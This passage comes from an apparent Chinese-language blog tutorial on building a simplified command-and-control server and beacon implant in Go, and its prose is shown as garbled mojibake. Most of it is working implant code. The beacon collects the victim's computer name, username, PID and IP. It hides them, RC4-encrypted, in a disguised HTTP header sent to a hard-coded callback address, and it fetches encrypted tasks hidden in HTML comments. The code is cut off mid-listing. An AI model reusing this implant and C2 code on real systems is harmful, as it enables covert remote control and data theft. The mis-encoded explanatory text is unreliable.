<p>ä¸Šè¿°ä»£ç çš„åŠŸèƒ½å°±æ˜¯å»è§£æå­˜æ”¾åœ¨è‡ªå®šä¹‰è¯·æ±‚å¤´ä¸­çš„å¿ƒè·³åŒ…ï¼Œç„¶åbase64è§£ç ï¼Œæ¥ç€RC4è§£å¯†ï¼Œæœ¬æ–‡å¹¶æœªå®ç°ä¸Šçº¿æ³¨å†Œçš„ç›¸å…³ä»£ç ï¼Œæ‰€ä»¥æœ€åä¼šåœ¨serverçš„æ§åˆ¶å°è¾“å‡ºä¸€ä¸²ç´§å‡‘çš„jsonå­—ç¬¦ä¸²ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/23/21-27-10-dda8741b5cf8a02d2650574f150186e8-20250923212709-a28776.png"></p>
<p>processRequestæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processRequest</span><span class="params">(ctx *gin.Context)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è§£æå¿ƒè·³åŒ…  </span></span><br><span class="line">    parseBeat(ctx)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è·å–å®¢æˆ·ç«¯IP  </span></span><br><span class="line">    externalIP := clientIP(ctx.Request)  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;   Received request from %s\n&quot;</span>, externalIP)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å°†ä»»åŠ¡æ•°æ®åµŒå…¥åˆ°htmlæ¨¡æ¿ä¸­  </span></span><br><span class="line">    payload, err := os.ReadFile(payloadPath)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// RC4 åŠ å¯†  </span></span><br><span class="line">    encryptData, err := RC4Crypt([]<span class="type">byte</span>(taskData), []<span class="type">byte</span>(EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// åµŒå…¥ä»»åŠ¡æ•°æ®åˆ°htmlæ¨¡æ¿ä¸­  </span></span><br><span class="line">    html := []<span class="type">byte</span>(strings.ReplaceAll(<span class="type">string</span>(payload), placeholder, <span class="type">string</span>(encryptData)))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è®¾ç½®å“åº”å¤´å¹¶è¿”å›åŠ å¯†æ•°æ®  </span></span><br><span class="line">    setHeaders(ctx)  </span><br><span class="line">    _, _ = ctx.Writer.Write(html)  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“Beaconé€šè¿‡Getæ–¹æ³•è®¿é—®ç›¸åº”çš„æ¥å£æ—¶ï¼Œä¼šç”± <code>processRequest</code> å¤„ç†è¯·æ±‚ã€‚<code>processRequest</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>parseBeat</code> æ–¹æ³•è§£æå¿ƒè·³åŒ…ï¼Œç„¶åè·å–externalIPï¼Œè¿™ä¸ªå’Œä¸Šä¸€æ­¥æ˜¯è¿åœ¨ä¸€èµ·ä¸ºæ³¨å†ŒBeaconåšå‡†å¤‡çš„ï¼ˆæœ¬æ–‡æœªå®ç°æ³¨å†Œï¼‰ã€‚ç´§æ¥ç€æ ¹æ®placeholderå ä½ç¬¦æ‰¾åˆ°æ•°æ®å­˜æ”¾çš„ä½ç½®ï¼Œå°†åŠ å¯†åçš„ä»»åŠ¡æ•°æ®åµŒå…¥åˆ°htmlæ¨¡æ¿ä¸­ã€‚æœ€åè®¾ç½®å“åº”å¤´è¿”å›hmtlå†…å®¹ç»™Beaconã€‚</p>
<p>processResponseæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">processResponse</span><span class="params">(ctx *gin.Context)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è§£æå¿ƒè·³åŒ…  </span></span><br><span class="line">    parseBeat(ctx)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è·å–å®¢æˆ·ç«¯IP  </span></span><br><span class="line">    externalIP := clientIP(ctx.Request)  </span><br><span class="line">    fmt.Printf(<span class="string">&quot;   Received request from %s\n&quot;</span>, externalIP)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// å¤„ç† agent æ•°æ®  </span></span><br><span class="line">    <span class="comment">// è¯»å–åŸå§‹ body    </span></span><br><span class="line">    bodyBytes, _ := io.ReadAll(ctx.Request.Body)  </span><br><span class="line">    <span class="keyword">defer</span> ctx.Request.Body.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è§£å¯† body    </span></span><br><span class="line">    decryptedData, err := RC4Crypt(bodyBytes, []<span class="type">byte</span>(EncryptKey))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       pageError(ctx)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    log.Printf(<span class="string">&quot;[HTTP] â† String view:\n%s&quot;</span>, <span class="type">string</span>(decryptedData))  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// è¿”å›æˆåŠŸå“åº”  </span></span><br><span class="line">    setHeaders(ctx)  </span><br><span class="line">    ctx.AbortWithStatus(http.StatusOK)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å½“Beaconé€šè¿‡POSTæ–¹æ³•è®¿é—®ç›¸åº”çš„æ¥å£æ—¶ï¼Œä¼šç”± <code>processResponse</code> å¤„ç†è¯·æ±‚ã€‚<code>processResponse</code> ä¹Ÿä¼šè°ƒç”¨ <code>parseBeat</code> è§£æå¿ƒè·³åŒ…å’Œè·å–å®¢æˆ·ç«¯IPï¼Œè¿™ä¸»è¦æ˜¯ä¸ºäº†ä¿é™©èµ·è§ï¼Œå½“ç„¶æˆ‘è§‰å¾—æ˜¯å¾ˆå†—ä½™äº†ï¼Œæœ‰å…´è¶£çš„å¸ˆå‚…å¯ä»¥è‡ªå·±ä¿®æ”¹ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆåœ¨Serverçš„æ§åˆ¶å°è¾“å‡ºä¸¤æ®µå¿ƒè·³åŒ…çš„åŸå› ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/10/23-04-15-4b1bd303def923e00cb0d64753377554-20250910230415-dc86c7.png"></p>
<p>ç´§æ¥ç€ä¼šæå–è¯·æ±‚åŒ…é‡Œçš„å†…å®¹ï¼Œå°†bodyè§£å¯†ï¼Œç›´æ¥è¾“å‡ºåˆ°Serverçš„æ§åˆ¶å°ä¸Šã€‚å› ä¸ºå¹¶æ²¡æœ‰æŒ‡å®šç¼–ç çš„åŸå› ï¼Œæ§åˆ¶å°ä¼šè¾“å‡ºä¹±ç ï¼Œå¯ä»¥ç”¨é¡¹ç›®ä¸­è‡ªå¸¦çš„utils.ConvertUTF8toCpæ–¹æ³•è½¬æ¢ç¼–ç ï¼Œè¿™éœ€è¦ååºåˆ—åŒ–å¿ƒè·³åŒ…ï¼Œå¾—åˆ°ACPå­—æ®µçš„å€¼ï¼Œå› ä¸ºæ¯”è¾ƒéº»çƒ¦æˆ‘å°±ä¸åœ¨ä»£ç ä¸­å®ç°äº†ã€‚</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/11-10-45-c1fef14c4d315c911bef98817156675f-20250907111045-28cb97.png"></p>
<p>æœ€åå°±æ˜¯mainæ–¹æ³•äº†</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    srv := ListenerStart()  </span><br><span class="line">  </span><br><span class="line">    quit := <span class="built_in">make</span>(<span class="keyword">chan</span> os.Signal, <span class="number">1</span>)  </span><br><span class="line">    signal.Notify(quit, os.Interrupt, syscall.SIGTERM)  </span><br><span class="line">    &lt;-quit <span class="comment">// é˜»å¡ç›´åˆ° Ctrl-C    </span></span><br><span class="line">    ctx, cancel := context.WithTimeout(context.Background(), <span class="number">5</span>*time.Second)  </span><br><span class="line">    <span class="keyword">defer</span> cancel()  </span><br><span class="line">    <span class="keyword">if</span> err := srv.Shutdown(ctx); err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Server forced to shutdown:&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">    fmt.Println(<span class="string">&quot;Server exited&quot;</span>)  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå”¯ä¸€éœ€è¦è¯´æ˜çš„æ˜¯ï¼šæˆ‘ä»¬åœ¨ä»£ç ä¸­å•ç‹¬å¯ç”¨ä¸€ä¸ªgoroutineå»æ‰§è¡ŒHTTPç›‘å¬å™¨ï¼Œä¸ç”¨goroutineåˆ™ä¸»çº¿ç¨‹ä¼šè¢« <code>ListenAndServe</code> æ°¸è¿œå ä½ï¼Œåœ¨å®é™…é¡¹ç›®ä¸­è¿™æ˜¯ä¸åˆç†çš„ï¼›å¦‚æœç”¨äº†goroutineï¼Œåœ¨mainä¸­ä¸ç›‘å¬ç›‘å¬ç»“æŸä¿¡å·ï¼Œåˆ™ä¸»çº¿ç¨‹åœ¨å¯åŠ¨å®Œ <code>ListenAndServe</code> å°±ç›´æ¥ç»“æŸï¼Œç›‘å¬çš„goroutineä¹Ÿè·Ÿç€è¢«å¼ºåˆ¶æ€æ‰ã€‚</p>
<h3 id="1-2-2-Beacon"><a href="#1-2-2-Beacon" class="headerlink" title="1.2.2 Beacon"></a>1.2.2 Beacon</h3><p>å®šä¹‰ç®€åŒ–åçš„BeaconConfigå’ŒHeartBeatç»“æ„ä½“ï¼Œåªä¿ç•™æˆ‘è®¤ä¸ºå…³é”®çš„å­—æ®µã€‚ç„¶ååˆ›å»ºå…¨å±€å˜é‡beaconProfileå’ŒheartBeatï¼Œå„ä¸ªå­—æ®µç¡¬ç¼–ç ï¼</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> BeaconConfig <span class="keyword">struct</span> &#123;  </span><br><span class="line">    Sleep           <span class="type">int32</span>  </span><br><span class="line">    Jitter          <span class="type">int32</span>  </span><br><span class="line">    URI             <span class="type">string</span>  </span><br><span class="line">    CallBackAddress <span class="type">string</span>  </span><br><span class="line">    IS_HTTPS        <span class="type">bool</span>  </span><br><span class="line">    EncryptKey      []<span class="type">byte</span>  </span><br><span class="line">    HBHeader        <span class="type">string</span>  </span><br><span class="line">    HBPrefix        <span class="type">string</span>  </span><br><span class="line">    UserAgent       <span class="type">string</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">type</span> HeartBeat <span class="keyword">struct</span> &#123;  </span><br><span class="line">    BeaconId    <span class="type">int32</span>  <span class="string">`json:&quot;beacon_id&quot;`</span>  </span><br><span class="line">    Sleep       <span class="type">int32</span>  <span class="string">`json:&quot;sleep&quot;`</span>  </span><br><span class="line">    Jitter      <span class="type">int32</span>  <span class="string">`json:&quot;jitter&quot;`</span>  </span><br><span class="line">    PID         <span class="type">int32</span>  <span class="string">`json:&quot;pid&quot;`</span>  </span><br><span class="line">    ACP         <span class="type">int32</span>  <span class="string">`json:&quot;acp&quot;`</span>  </span><br><span class="line">    InternalIP  <span class="type">int32</span>  <span class="string">`json:&quot;internal_ip&quot;`</span>  </span><br><span class="line">    Computer    <span class="type">string</span> <span class="string">`json:&quot;computer&quot;`</span>  </span><br><span class="line">    Username    <span class="type">string</span> <span class="string">`json:&quot;username&quot;`</span>  </span><br><span class="line">    ProcessName <span class="type">string</span> <span class="string">`json:&quot;process_name&quot;`</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> beaconProfile = BeaconConfig&#123;  </span><br><span class="line">    Sleep:           <span class="number">5</span>,  </span><br><span class="line">    Jitter:          <span class="number">2</span>,  </span><br><span class="line">    URI:             <span class="string">&quot;/cdn-cgi/trace&quot;</span>,  </span><br><span class="line">    CallBackAddress: <span class="string">&quot;192.168.3.1:9090&quot;</span>,  </span><br><span class="line">    IS_HTTPS:        <span class="literal">false</span>,  </span><br><span class="line">    EncryptKey:      []<span class="type">byte</span>(<span class="string">&quot;01234567890123456789&quot;</span>),  </span><br><span class="line">    HBHeader:        <span class="string">&quot;X-Session-Id&quot;</span>,  </span><br><span class="line">    HBPrefix:        <span class="string">&quot;session=&quot;</span>,  </span><br><span class="line">    UserAgent:       <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;</span>,  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">var</span> heartBeat = HeartBeat&#123;  </span><br><span class="line">    BeaconId:    rand.Int32(),  </span><br><span class="line">    Sleep:       beaconProfile.Sleep,  </span><br><span class="line">    Jitter:      beaconProfile.Jitter,  </span><br><span class="line">    PID:         <span class="type">int32</span>(os.Getpid()),  </span><br><span class="line">    ACP:         utils.GetCodePageANSI(),  </span><br><span class="line">    InternalIP:  <span class="type">int32</span>(utils.GetInternalIp()),  </span><br><span class="line">    Computer:    utils.GetComputerName(),  </span><br><span class="line">    Username:    utils.GetUsername(),  </span><br><span class="line">    ProcessName: utils.GetProcessName(),  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HttpGetæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HttpGet</span><span class="params">(metaData []<span class="type">byte</span>)</span></span> ([]<span class="type">byte</span>, <span class="type">error</span>) &#123;  </span><br><span class="line">  </span><br><span class="line">    url := fmt.Sprintf(<span class="string">&quot;http://%s%s&quot;</span>, beaconProfile.CallBackAddress, beaconProfile.URI)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ====== RC4åŠ å¯† ======    </span></span><br><span class="line">    rc4_key := beaconProfile.EncryptKey  </span><br><span class="line">    encryptedMetaData, err := utils.RC4Crypt(metaData, rc4_key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// ====== base64url ç¼–ç  ======    </span></span><br><span class="line">    metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ====== è®¾ç½®åˆ°è¯·æ±‚å¤´ ======    </span></span><br><span class="line">    cookieValue := beaconProfile.HBPrefix + metaDataB64  </span><br><span class="line">  </span><br><span class="line">    req, err := http.NewRequest(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">nil</span>)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Request error:&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    req.Header.Set(beaconProfile.HBHeader, cookieValue)  </span><br><span class="line">    req.Header.Set(<span class="string">&quot;User-Agent&quot;</span>, beaconProfile.UserAgent)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// ====== å‘é€HTTP GETè¯·æ±‚ ======    </span></span><br><span class="line">    client := &amp;http.Client&#123;&#125;  </span><br><span class="line">    resp, err := client.Do(req)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;HTTP error:&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, err  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()  </span><br><span class="line">    respBytes, _ := io.ReadAll(resp.Body)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> resp.StatusCode != <span class="number">200</span> &#123;  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Status:&quot;</span>, resp.StatusCode)  </span><br><span class="line">       fmt.Println(<span class="string">&quot;Decrypted Response:&quot;</span>, <span class="type">string</span>(respBytes))  </span><br><span class="line">       <span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;http response error:&quot;</span>)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> respBytes, <span class="literal">nil</span>  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>HttpGet</code> æŠŠä¼ å…¥çš„ <code>metaData</code> å…ˆç”¨ RC4 åŠ å¯†â†’Base64URLç¼–ç â†’å¡è¿›æŒ‡å®š HTTPè¯·æ±‚å¤´â†’å‘GETè¯·æ±‚â†’è¯»å–å¹¶åŸæ ·è¿”å›å“åº”ä½“ï¼Œç”¨äº Beaconä¸Šçº¿&#x2F;å¿ƒè·³&#x2F;æ‹‰å–ä»»åŠ¡æ—¶æŠŠä¸»æœºä¿¡æ¯éšå†™åœ¨è¯·æ±‚å¤´Headeré‡Œå›ä¼ ç»™C2æœåŠ¡å™¨ã€‚</p>
<p>è¿™å°±æ˜¯æ‹‰å–åï¼ŒServerè¿”å›ç»™Beaconçš„htmlé¡µé¢</p>
<p><img src="https://images-of-oneday.oss-cn-guangzhou.aliyuncs.com/images/2025/09/07/11-28-26-c2bc30fe89b40efe427b7b2a226de575-20250907112826-17596d.png"></p>
<p>HttpPostæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HttpPost</span><span class="params">(metaData []<span class="type">byte</span>, body []<span class="type">byte</span>)</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    url := fmt.Sprintf(<span class="string">&quot;http://%s%s&quot;</span>, beaconProfile.CallBackAddress, beaconProfile.URI)  </span><br><span class="line">    rc4Key := beaconProfile.EncryptKey  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 1. åŠ å¯† metaData    </span></span><br><span class="line">    encryptedMetaData, err := utils.RC4Crypt(metaData, rc4Key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || encryptedMetaData == <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;rc4 encrypt metaData error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    metaDataB64 := base64.RawURLEncoding.EncodeToString(encryptedMetaData)  </span><br><span class="line">    cookieValue := beaconProfile.HBPrefix + metaDataB64  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 2. åŠ å¯† body    </span></span><br><span class="line">    encryptedBody, err := utils.RC4Crypt(body, rc4Key)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> || encryptedBody == <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;rc4 encrypt body error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 3. æ„é€ è¯·æ±‚  </span></span><br><span class="line">    req, err := http.NewRequest(<span class="string">&quot;POST&quot;</span>, url, bytes.NewReader(encryptedBody))  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;request error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    req.Header.Set(beaconProfile.HBHeader, cookieValue)  </span><br><span class="line">    req.Header.Set(<span class="string">&quot;User-Agent&quot;</span>, beaconProfile.UserAgent)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 4. å‘é€  </span></span><br><span class="line">    client := &amp;http.Client&#123;&#125;  </span><br><span class="line">    resp, err := client.Do(req)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;http do error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// åªæœ‰ resp != nil æ‰éœ€è¦å…³é—­  </span></span><br><span class="line">    <span class="keyword">defer</span> resp.Body.Close()  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 5. è¯»å–å“åº”  </span></span><br><span class="line">    respBytes, err := io.ReadAll(resp.Body)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;read response error: %v\n&quot;</span>, err)  </span><br><span class="line">       <span class="keyword">return</span>  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> resp.StatusCode != http.StatusOK &#123;  </span><br><span class="line">       fmt.Printf(<span class="string">&quot;Status: %d\nDecrypted Response: %s\n&quot;</span>,  </span><br><span class="line">          resp.StatusCode, <span class="type">string</span>(respBytes))  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>HttpPost</code> æŠŠ <code>metaData</code> å’Œ <code>body</code> åˆ†åˆ« RC4 åŠ å¯†â†’Base64URL åï¼Œå‰è€…å¡è¿›æŒ‡å®šè¯·æ±‚å¤´ã€åè€…ä½œä¸ºPOSTå¯†æ–‡ä½“ï¼Œç”¨äº Beacon å›ä¼ å‘½ä»¤ç»“æœæˆ–å¤§å‹æ•°æ®ã€‚æœ€åä¼šå¾—åˆ°å“åº”ï¼Œå“åº”ç åªæœ‰404ï¼ˆpageErrorï¼‰æˆ–è€…200ï¼ˆæˆåŠŸï¼‰ã€‚</p>
<p>mainå’ŒrunCommandæ–¹æ³•</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">var</span> (  </span><br><span class="line">       AssemblyBuff []<span class="type">byte</span>  </span><br><span class="line">       err          <span class="type">error</span>  </span><br><span class="line">    )  </span><br><span class="line">    metaData, err := json.Marshal(heartBeat)  </span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;  </span><br><span class="line">       log.Fatalf(<span class="string">&quot;json marshal error:%v&quot;</span>, err)  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">for</span> &#123;  </span><br><span class="line">       <span class="comment">// å‘é€HTTP GETè¯·æ±‚  </span></span><br><span class="line">       AssemblyBuff, err = HttpGet(metaData)  </span><br><span class="line">       <span class="built_in">println</span>(<span class="type">string</span>(AssemblyBuff))  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// è§£æå“åº”ï¼Œæå–åŠ å¯†åçš„å‘½ä»¤  </span></span><br><span class="line">       encryptedtext := regexp.MustCompile(<span class="string">`&lt;!--\s*(.*?)\s*--&gt;`</span>)  </span><br><span class="line">       matches := encryptedtext.FindSubmatch(AssemblyBuff)  </span><br><span class="line">       <span 